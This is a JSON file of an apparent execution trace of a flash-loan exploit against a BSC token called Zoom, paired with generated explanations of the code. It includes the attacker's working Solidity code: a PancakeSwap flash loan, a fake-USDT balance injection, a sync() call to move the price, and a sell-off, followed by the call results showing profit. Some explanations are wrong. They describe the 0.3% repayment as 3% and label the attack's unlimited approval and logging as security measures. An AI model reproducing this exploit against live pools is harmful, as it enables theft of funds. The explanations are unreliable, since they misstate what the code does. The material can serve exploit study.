@@ -1,0 +1,485 @@
+[
+    {
+        "id": "687771",
+        "args": "",
+        "original_code": "    function testExploit() public {\n        emit log_named_decimal_uint(\"[Start] Attacker WBNB balance before exploit\", Usdt.balanceOf(address(this)), 18);\n\n        // flashloan - Brrow 3,000,000 USDT\n        PancakePair.swap(3_000_000_000_000_000_000_000_000, 0, address(this), new bytes(1));\n\n        emit log_named_decimal_uint(\n            \"[End] After repay, Profit: USDT balance of attacker\", Usdt.balanceOf(address(this)), 18\n        );\n    }\n\n",
+        "description": "1. **Core functions:**  \n   The `testExploit` function is designed to simulate an attack or exploit scenario in a decentralized finance (DeFi) environment. It starts by logging the attacker's initial balance of a specific token (WBNB). Then, it performs a flash loan operation, borrowing a large amount of USDT (3,000,000 USDT) from a PancakeSwap liquidity pool. After the loan is repaid, it logs the attacker's final USDT balance to calculate the profit made from the exploit.\n\n2. **Security mechanism:**  \n   The function does not explicitly include security mechanisms like access control or input validation. However, it relies on the underlying DeFi protocol (PancakeSwap) to handle the flash loan process, which typically includes safeguards to ensure the loan is repaid within the same transaction. The use of `emit` for logging helps track the flow of funds, which can be useful for auditing or debugging.\n\n3. **Parameter Function:**  \n   The `swap` function in PancakePair takes four parameters:  \n   - The first parameter (`3_000_000_000_000_000_000_000_000`) specifies the amount of USDT to borrow.  \n   - The second parameter (`0`) indicates that no other token is being swapped.  \n   - The third parameter (`address(this)`) specifies the recipient of the borrowed funds (the attacker's address).  \n   - The fourth parameter (`new bytes(1)`) is a placeholder for additional data, which is not used in this case.  \n\n4. **Return description:**  \n   The function does not return any value directly. Instead, it uses `emit` to log two key pieces of information:  \n   - The attacker's initial WBNB balance before the exploit.  \n   - The attacker's final USDT balance after the exploit, which represents the profit made.  \n\n**In summary,**  \nThe `testExploit` function simulates a flash loan attack by borrowing a large amount of USDT, repaying it, and calculating the profit. It relies on the underlying DeFi protocol for security and uses logging to track the flow of funds. The function does not return a value but provides insights into the attacker's balance changes through emitted events.",
+        "return_value": "Returned"
+    },
+    {
+        "id": "2531",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "666318",
+        "args": "3000000000000000000000000 [3e24], 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x00",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "27971",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 3000000000000000000000000 [3e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "607414",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 3000000000000000000000000 [3e24], 0, 0x00",
+        "original_code": "    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) public {\n        uint256 ba = Usdt.balanceOf(address(this));\n        Usdt.approve(swap, 100_000_000_000_000_000_000_000_000_000_000_000_000);\n\n        // use usdt to swap zoom\n        IUSD(swap).buy(ba);\n        emit log_named_decimal_uint(\"Zoom balance of attacker:\", Zoom.balanceOf(address(this)), 18);\n\n        address[] memory n1 = new address[](1);\n        n1[0] = pp;\n        uint256[] memory n2 = new uint256[](1);\n        n2[0] = 1_000_000 ether;\n        emit log_named_decimal_uint(\n            \"Before manipulate price, Fake USDT balance of pair:\", IERC20(fUSDT).balanceOf(address(pp)), 18\n        );\n        emit log_named_decimal_uint(\"Before manipulate price, Zoom balance of pair:\", Zoom.balanceOf(address(pp)), 18);\n        IUSD(batch).batchToken(n1, n2, fUSDT);\n\n        emit log_named_decimal_uint(\n            \"After manipulate price, Fake USDT balance of pair:\", IERC20(fUSDT).balanceOf(address(pp)), 18\n        );\n        emit log_named_decimal_uint(\"After manipulate price, Zoom balance of pair:\", Zoom.balanceOf(address(pp)), 18);\n\n        // calling pair Fake USDT-Zoom sync() to update latest price\n        IUSD(pp).sync();\n\n        uint256 baz = Zoom.balanceOf(address(this));\n        Zoom.approve(swap, baz * 100);\n        IUSD(swap).sell(baz);\n\n        emit log_named_decimal_uint(\"After selling Zoom, USDT balance of attacker:\", Usdt.balanceOf(address(this)), 18);\n        //Repay flashloan\n        Usdt.transfer(address(PancakePair), (ba * 10_030) / 10_000);\n\n        uint256 U = Usdt.balanceOf(address(this));\n        IERC20(usdt).transfer(address(this), U);\n    }\n\n",
+        "description": "1. Core functions:\n   This function is designed to execute a series of operations involving token swaps and balance manipulations. It starts by checking the balance of a specific token (USDT) in the contract. Then, it approves a large amount of USDT for a swap operation, buys another token (Zoom) using USDT, and logs the Zoom balance. After that, it manipulates the balances of two tokens (Fake USDT and Zoom) in a specific pair to influence the price. It updates the price by syncing the pair, sells the Zoom token back for USDT, and finally repays a flash loan with a small fee. The function ends by transferring the remaining USDT balance back to the contract.\n\n2. Security mechanism:\n   The function includes several security measures:\n   - It uses `approve` to set a high allowance for the swap operation, ensuring that the swap can proceed without running out of approved tokens.\n   - It emits logs at various stages to track the balances and state changes, which helps in monitoring and debugging.\n   - It repays the flash loan with a fee (3% more than the borrowed amount), ensuring that the loan is repaid correctly.\n   - It transfers the remaining USDT balance back to the contract, ensuring that no funds are left unaccounted for.\n\n3. Parameter Function:\n   - `sender`: The address that initiated the call, typically the flash loan provider.\n   - `amount0` and `amount1`: The amounts of the two tokens involved in the flash loan.\n   - `data`: Additional data that might be needed for the operation, though it is not used in this function.\n\n4. Return description:\n   The function does not return any value directly. Instead, it performs a series of operations that result in changes to the contract's token balances and the state of the token pairs. The final action is transferring the remaining USDT balance back to the contract, which effectively concludes the function's operations.\n\nIn summary, this function orchestrates a complex sequence of token swaps and balance manipulations to influence token prices, repay a flash loan, and ensure that the contract's state is updated correctly. It includes several security measures to monitor and safeguard the operations.",
+        "return_value": "Returned"
+    },
+    {
+        "id": "531",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "3000000000000000000000000 [3e24]"
+    },
+    {
+        "id": "24562",
+        "args": "0x5a9846062524631C01ec11684539623DAb1Fae58, 100000000000000000000000000000000000000 [1e38]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "322503",
+        "args": "3000000000000000000000000 [3e24]",
+        "original_code": "",
+        "description": "",
+        "return_value": "Returned"
+    },
+    {
+        "id": "27934",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x5a9846062524631C01ec11684539623DAb1Fae58, 3000000000000000000000000 [3e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "186390",
+        "args": "3000000000000000000000000 [3e24], 0, [0x55d398326f99059fF775485246999027B3197955, 0x62D51AACb079e882b1cb7877438de485Cba0dD3f, 0x9CE084C378B3E65A164aeba12015ef3881E0F853], 0x5a9846062524631C01ec11684539623DAb1Fae58, 1662348485 [1.662e9]",
+        "original_code": null,
+        "description": null,
+        "return_value": "[3000000000000000000000000 [3e24], 3000000000000000000000000 [3e24], 431282196466483824764250811664 [4.312e29]]"
+    },
+    {
+        "id": "2540",
+        "args": "",
+        "original_code": "    function getReserves() public view returns (uint112 _reserve0, uint112 _reserve1, uint32 _blockTimestampLast) {\n        _reserve0 = reserve0;\n        _reserve1 = reserve1;\n        _blockTimestampLast = blockTimestampLast;\n    }\n\n",
+        "description": "1. **Core functions**:  \n   The `getReserves` function is designed to provide information about the current state of reserves in a system, typically used in decentralized exchanges or liquidity pools. It retrieves and returns the amounts of two reserves (`reserve0` and `reserve1`) and the timestamp of the last update (`blockTimestampLast`). This helps users or other contracts understand the available liquidity and the timing of the last update.\n\n2. **Security mechanism**:  \n   The function uses the `view` modifier, which ensures that it does not modify the state of the contract. This makes it safe to call without incurring gas costs or risking unintended changes to the contract. Additionally, since it only reads data, it does not expose the contract to potential vulnerabilities associated with state changes.\n\n3. **Parameter Function**:  \n   The function does not take any parameters. It simply accesses and returns the current values of `reserve0`, `reserve1`, and `blockTimestampLast` stored in the contract.\n\n4. **Return description**:  \n   The function returns three values:  \n   - `_reserve0`: The current amount of the first reserve.  \n   - `_reserve1`: The current amount of the second reserve.  \n   - `_blockTimestampLast`: The timestamp of the last update to the reserves.  \n   These values are directly fetched from the contract's storage and returned without any additional calculations.\n\n**In summary**, the `getReserves` function is a simple, read-only utility that provides essential information about the reserves and the last update time, ensuring transparency and accessibility in a secure manner.",
+        "return_value": "15198754777163623656927698 [1.519e25], 2620645036763942583008253456483 [2.62e30], 1662348362 [1.662e9]"
+    },
+    {
+        "id": "2343",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000000000000000003e6"
+    },
+    {
+        "id": "15634",
+        "args": "0x5a9846062524631C01ec11684539623DAb1Fae58, 0xf72Fd2A9cDF1DB6d000A6181655e0F072fc47208, 3000000000000000000000000 [3e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "61950",
+        "args": "0, 3000000000000000000000000 [3e24], 0x1c7ecBfc48eD0B34AAd4a9F338050685E66235C5, 0x, true",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "20175",
+        "args": "0x1c7ecBfc48eD0B34AAd4a9F338050685E66235C5, 3000000000000000000000000 [3e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "531",
+        "args": "0xf72Fd2A9cDF1DB6d000A6181655e0F072fc47208",
+        "original_code": null,
+        "description": null,
+        "return_value": "3084987473365001802519581 [3.084e24]"
+    },
+    {
+        "id": "1022",
+        "args": "0xf72Fd2A9cDF1DB6d000A6181655e0F072fc47208",
+        "original_code": null,
+        "description": null,
+        "return_value": "7015014526634998197480419 [7.015e24]"
+    },
+    {
+        "id": "73147",
+        "args": "0, 431282196466483824764250811664 [4.312e29], 0x5a9846062524631C01ec11684539623DAb1Fae58, 0x, false",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "32380",
+        "args": "0x5a9846062524631C01ec11684539623DAb1Fae58, 431282196466483824764250811664 [4.312e29]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "2706",
+        "args": "0x5a9846062524631C01ec11684539623DAb1Fae58",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000000"
+    },
+    {
+        "id": "1022",
+        "args": "0x1c7ecBfc48eD0B34AAd4a9F338050685E66235C5",
+        "original_code": null,
+        "description": null,
+        "return_value": "18198754777163623656927698 [1.819e25]"
+    },
+    {
+        "id": "1072",
+        "args": "0x1c7ecBfc48eD0B34AAd4a9F338050685E66235C5",
+        "original_code": null,
+        "description": null,
+        "return_value": "2189362840297458758244002644819 [2.189e30]"
+    },
+    {
+        "id": "2706",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000000"
+    },
+    {
+        "id": "24045",
+        "args": "0xb0d201428066b2eC92A8cE0fA2ED89d9A39cB27D, 4312821964664838247642508116 [4.312e27]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "2706",
+        "args": "0xb0d201428066b2eC92A8cE0fA2ED89d9A39cB27D",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000000"
+    },
+    {
+        "id": "19895",
+        "args": "0xe033B596b78856F76dDA12a28a51BF1527DB25B1, 2587693178798902948585504869 [2.587e27]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "2706",
+        "args": "0xe033B596b78856F76dDA12a28a51BF1527DB25B1",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000000"
+    },
+    {
+        "id": "32495",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 424381681323020083568022798677 [4.243e29]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "706",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000000"
+    },
+    {
+        "id": "1072",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "424381681323020083568022798677 [4.243e29]"
+    },
+    {
+        "id": "1022",
+        "args": "0x1c7ecBfc48eD0B34AAd4a9F338050685E66235C5",
+        "original_code": null,
+        "description": null,
+        "return_value": "18198754777163623656927698 [1.819e25]"
+    },
+    {
+        "id": "1072",
+        "args": "0x1c7ecBfc48eD0B34AAd4a9F338050685E66235C5",
+        "original_code": null,
+        "description": null,
+        "return_value": "2189362840297458758244002644819 [2.189e30]"
+    },
+    {
+        "id": "14204",
+        "args": "[0x1c7ecBfc48eD0B34AAd4a9F338050685E66235C5], [1000000000000000000000000 [1e24]], 0x62D51AACb079e882b1cb7877438de485Cba0dD3f",
+        "original_code": "",
+        "description": "",
+        "return_value": "Returned"
+    },
+    {
+        "id": "11375",
+        "args": "0x1c7ecBfc48eD0B34AAd4a9F338050685E66235C5, 1000000000000000000000000 [1e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "1022",
+        "args": "0x1c7ecBfc48eD0B34AAd4a9F338050685E66235C5",
+        "original_code": null,
+        "description": null,
+        "return_value": "19198754777163623656927698 [1.919e25]"
+    },
+    {
+        "id": "1072",
+        "args": "0x1c7ecBfc48eD0B34AAd4a9F338050685E66235C5",
+        "original_code": null,
+        "description": null,
+        "return_value": "2189362840297458758244002644819 [2.189e30]"
+    },
+    {
+        "id": "8744",
+        "args": "",
+        "original_code": "    function sync() external lock {\n        _update(IERC20(token0).balanceOf(address(this)), IERC20(token1).balanceOf(address(this)), reserve0, reserve1);\n    }\n}\n",
+        "description": "1. **Core functions:**  \nThe `sync` function is designed to update the internal state of a contract to reflect the current balances of two tokens held by the contract. It ensures that the contract's stored reserves match the actual token balances in the contract's address. This is useful in scenarios where the contract needs to stay synchronized with the real-world token balances, such as in decentralized exchanges or liquidity pools.\n\n2. **Security mechanism:**  \nThe function uses the `lock` modifier, which prevents reentrancy attacks. Reentrancy attacks occur when an external call allows an attacker to repeatedly call a function before the previous execution completes, potentially draining funds or manipulating the contract's state. The `lock` modifier ensures that the function cannot be called again until the current execution is finished, adding a layer of protection.\n\n3. **Parameter Function:**  \nThe function does not take any explicit parameters. However, it internally retrieves the balances of two tokens (`token0` and `token1`) held by the contract using `IERC20(token0).balanceOf(address(this))` and `IERC20(token1).balanceOf(address(this))`. These balances are then passed to the `_update` function along with the current reserves (`reserve0` and `reserve1`).\n\n4. **Return description:**  \nThe function does not return any value. Its primary purpose is to update the contract's internal state by calling the `_update` function with the current token balances and reserves. The `_update` function likely adjusts the stored reserves to match the actual token balances, ensuring the contract remains accurate and up-to-date.\n\n**In summary,**  \nThe `sync` function ensures the contract's internal state matches the actual token balances by updating the reserves. It uses the `lock` modifier to prevent reentrancy attacks and does not return any value, focusing solely on maintaining synchronization.",
+        "return_value": "Returned"
+    },
+    {
+        "id": "1022",
+        "args": "0x1c7ecBfc48eD0B34AAd4a9F338050685E66235C5",
+        "original_code": null,
+        "description": null,
+        "return_value": "19198754777163623656927698 [1.919e25]"
+    },
+    {
+        "id": "1072",
+        "args": "0x1c7ecBfc48eD0B34AAd4a9F338050685E66235C5",
+        "original_code": null,
+        "description": null,
+        "return_value": "2189362840297458758244002644819 [2.189e30]"
+    },
+    {
+        "id": "1072",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "424381681323020083568022798677 [4.243e29]"
+    },
+    {
+        "id": "24763",
+        "args": "0x5a9846062524631C01ec11684539623DAb1Fae58, 42438168132302008356802279867700 [4.243e31]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "125819",
+        "args": "424381681323020083568022798677 [4.243e29]",
+        "original_code": "",
+        "description": "",
+        "return_value": "Returned"
+    },
+    {
+        "id": "11220",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x5a9846062524631C01ec11684539623DAb1Fae58, 424381681323020083568022798677 [4.243e29]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "706",
+        "args": "0x5a9846062524631C01ec11684539623DAb1Fae58",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000000"
+    },
+    {
+        "id": "706",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000000"
+    },
+    {
+        "id": "6745",
+        "args": "0xb0d201428066b2eC92A8cE0fA2ED89d9A39cB27D, 4243816813230200835680227986 [4.243e27]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "706",
+        "args": "0xb0d201428066b2eC92A8cE0fA2ED89d9A39cB27D",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000000"
+    },
+    {
+        "id": "6595",
+        "args": "0xe033B596b78856F76dDA12a28a51BF1527DB25B1, 2546290087938120501408136792 [2.546e27]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "706",
+        "args": "0xe033B596b78856F76dDA12a28a51BF1527DB25B1",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000000"
+    },
+    {
+        "id": "94684",
+        "args": "417591574421851762230934433898 [4.175e29], 0, [0x9CE084C378B3E65A164aeba12015ef3881E0F853, 0x62D51AACb079e882b1cb7877438de485Cba0dD3f, 0x55d398326f99059fF775485246999027B3197955], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1662348485 [1.662e9]",
+        "original_code": null,
+        "description": null,
+        "return_value": "[417591574421851762230934433898 [4.175e29], 3070160283128930726498344 [3.07e24], 3070160283128930726498344 [3.07e24]]"
+    },
+    {
+        "id": "540",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "19198754777163623656927698 [1.919e25], 2189362840297458758244002644819 [2.189e30], 1662348485 [1.662e9]"
+    },
+    {
+        "id": "343",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000000000000000003e6"
+    },
+    {
+        "id": "17921",
+        "args": "0x5a9846062524631C01ec11684539623DAb1Fae58, 0x1c7ecBfc48eD0B34AAd4a9F338050685E66235C5, 417591574421851762230934433898 [4.175e29]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "2706",
+        "args": "0x1c7ecBfc48eD0B34AAd4a9F338050685E66235C5",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000000"
+    },
+    {
+        "id": "21470",
+        "args": "3070160283128930726498344 [3.07e24], 0, 0xf72Fd2A9cDF1DB6d000A6181655e0F072fc47208, 0x, false",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "4575",
+        "args": "0xf72Fd2A9cDF1DB6d000A6181655e0F072fc47208, 3070160283128930726498344 [3.07e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "1022",
+        "args": "0x1c7ecBfc48eD0B34AAd4a9F338050685E66235C5",
+        "original_code": null,
+        "description": null,
+        "return_value": "16128594494034692930429354 [1.612e25]"
+    },
+    {
+        "id": "1072",
+        "args": "0x1c7ecBfc48eD0B34AAd4a9F338050685E66235C5",
+        "original_code": null,
+        "description": null,
+        "return_value": "2606954414719310520474937078717 [2.606e30]"
+    },
+    {
+        "id": "39074",
+        "args": "3070160283128930726498344 [3.07e24], 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x, true",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "23171",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 3070160283128930726498344 [3.07e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "531",
+        "args": "0xf72Fd2A9cDF1DB6d000A6181655e0F072fc47208",
+        "original_code": null,
+        "description": null,
+        "return_value": "14827190236071076021237 [1.482e22]"
+    },
+    {
+        "id": "1022",
+        "args": "0xf72Fd2A9cDF1DB6d000A6181655e0F072fc47208",
+        "original_code": null,
+        "description": null,
+        "return_value": "10085174809763928923978763 [1.008e25]"
+    },
+    {
+        "id": "531",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "3070160283128930726498344 [3.07e24]"
+    },
+    {
+        "id": "3271",
+        "args": "0x7EFaEf62fDdCCa950418312c6C91Aef321375A00, 3009000000000000000000000 [3.009e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "531",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "61160283128930726498344 [6.116e22]"
+    },
+    {
+        "id": "23171",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 61160283128930726498344 [6.116e22]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "531",
+        "args": "0x7EFaEf62fDdCCa950418312c6C91Aef321375A00",
+        "original_code": null,
+        "description": null,
+        "return_value": "95534740226653886119183165 [9.553e25]"
+    },
+    {
+        "id": "2531",
+        "args": "0x7EFaEf62fDdCCa950418312c6C91Aef321375A00",
+        "original_code": null,
+        "description": null,
+        "return_value": "95286004125679778378748903 [9.528e25]"
+    },
+    {
+        "id": "531",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "61160283128930726498344 [6.116e22]"
+    }
+]
